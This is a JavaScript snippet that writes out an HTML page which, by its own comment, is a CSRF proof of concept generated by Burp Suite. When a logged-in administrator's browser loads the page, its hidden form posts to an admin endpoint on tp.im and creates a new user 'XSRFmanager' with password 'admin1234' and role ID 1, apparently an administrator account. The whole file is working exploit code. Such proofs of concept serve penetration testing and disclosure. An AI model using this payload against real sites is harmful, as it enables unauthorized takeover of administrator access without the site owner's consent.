document.writeln("<html>");
document.writeln("  <!-- CSRF PoC - generated by Burp Suite Professional -->");
document.writeln("  <body>");
document.writeln("  <script>history.pushState(\'\', \'\', \'/\')</script>");
document.writeln("    <form action=\'http://tp.im/admin/user/addpost.html\' method=\'POST\'>");
document.writeln("      <input type=\'hidden\' name=\'user&#95;login\' value=\'XSRFmanager\' />");
document.writeln("      <input type=\'hidden\' name=\'user&#95;pass\' value=\'admin1234\' />");
document.writeln("      <input type=\'hidden\' name=\'user&#95;email\' value=\'789@bing.com\' />");
document.writeln("      <input type=\'hidden\' name=\'role&#95;id&#91;&#93;\' value=\'1\' />");
document.writeln("      <input type=\'submit\' value=\'Submit request\' />");
document.writeln("    </form>");
document.writeln("  </body>");
document.writeln("</html>");
document.writeln("");
